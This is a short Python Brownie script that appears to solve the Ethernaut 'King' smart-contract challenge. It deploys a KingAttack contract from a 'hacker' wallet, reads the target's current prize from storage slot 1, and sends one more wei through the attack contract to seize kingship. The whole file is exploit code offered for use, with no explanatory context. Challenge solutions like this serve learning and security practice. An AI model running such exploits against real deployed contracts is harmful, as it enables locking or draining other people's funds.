from brownie import web3, config, accounts, KingAttack, convert, interface

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack = KingAttack.deploy({'from': hacker})
    king = interface.KingInterface(target)
    value = web3.eth.get_storage_at(target, 1)
    value = convert.to_uint(value)
    print(f'Value: {value}')
    print(f'King: {king._king()}')
    attack.forward(target, {'from': hacker, 'amount': value+1})
    # attack.destroy()
    print(f'King: {king._king()}')


